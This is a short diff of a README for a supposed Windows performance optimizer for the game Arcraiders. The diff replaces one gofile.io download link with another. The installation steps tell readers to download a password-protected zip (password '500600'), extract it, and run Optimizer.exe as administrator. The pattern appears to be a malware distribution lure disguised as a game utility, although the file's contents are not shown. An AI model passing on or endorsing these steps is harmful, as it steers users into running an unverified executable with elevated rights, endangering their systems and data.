@@ -23,7 +23,7 @@ OS: Microsoft Windows 10/11 (64-Bit). Admin Rights Are Required to Apply Certain
 Game: Intended for Use With the Live/Public Version of Arcraiders.  
 
 # 📥 Installation & Usage   
-1. [Download](https://gofile.io/d/JPPwHp)
+1. [Download](https://gofile.io/d/njIOQY)
 2. Enter Password: `500600` And Extract the Zip Archive to Any Folder.  
 3. Run Optimizer.exe (Administrator Rights Are Recommended).  
 4. Follow the On-Screen Instructions to Review, Select, and Apply Tweaks.  
